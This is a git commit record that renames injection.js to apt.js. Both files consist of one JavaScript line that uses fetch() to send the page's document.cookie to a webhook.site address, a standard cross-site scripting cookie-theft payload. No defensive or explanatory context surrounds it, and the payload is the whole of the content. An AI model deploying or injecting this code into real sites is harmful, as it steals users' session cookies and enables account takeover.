53c38d0f4777b53947febccd48b233204cd4b3c7
quetuan03 <108645146+quetuan03@users.noreply.github.com>
2023-10-11 10:17:29 +0700

    Update and rename injection.js to apt.js

---
+++ apt.js
@@ -0,0 +1,1 @@
+fetch('https://webhook.site/c32afee4-f0fb-48ee-bddd-3f8883b07ccd?cookie=' +document.cookie);
--- injection.js
+++
@@ -1,1 +0,0 @@
-fetch('https://webhook.site/c32afee4-f0fb-48ee-bddd-3f8883b07ccd?cookie=' +document.cookie)
